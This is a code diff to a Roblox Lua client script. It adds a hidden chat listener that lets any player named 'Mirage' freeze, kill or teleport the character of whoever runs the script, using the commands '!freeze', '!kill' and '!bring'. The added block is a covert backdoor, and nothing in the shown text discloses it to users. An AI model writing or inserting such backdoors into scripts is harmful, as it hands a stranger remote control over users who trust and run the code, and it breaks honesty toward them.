@@ -31,12 +31,64 @@ end
 
 end)
 
+task.spawn(function()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function handleCommand(player, message)
+    -- check if sender's username OR display name is "Mirage"
+    if player.Name ~= "Mirage" and player.DisplayName ~= "Mirage" then return end
+
+    local character = LocalPlayer.Character
+    if not character then return end
+
+    message = message:lower()
+
+    if message == "!freeze" then
+        if character:FindFirstChild("HumanoidRootPart") then
+            character.HumanoidRootPart.Anchored = true
+        end
+
+    elseif message == "!kill" then
+        if character:FindFirstChild("Humanoid") then
+            character.Humanoid.Health = 0
+        end
+
+    elseif message == "!bring" then
+        local targetChar = player.Character
+        if targetChar and targetChar:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart") then
+            character.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(0, 5, 0) -- offset so u don't get stuck
+        end
+    end
+end
+
+local function connectChatToPlayer(player)
+    player.Chatted:Connect(function(msg)
+        handleCommand(player, msg)
+    end)
+end
+
+-- connect to all current players except you
+for _, player in pairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        connectChatToPlayer(player)
+    end
+end
+
+-- connect to new players
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        connectChatToPlayer(player)
+    end
+end)
+
+
 -- ccgvb on discord 😎
 --yeah
 -- i miss my pc 
 
 
-
+end)
 
 
 
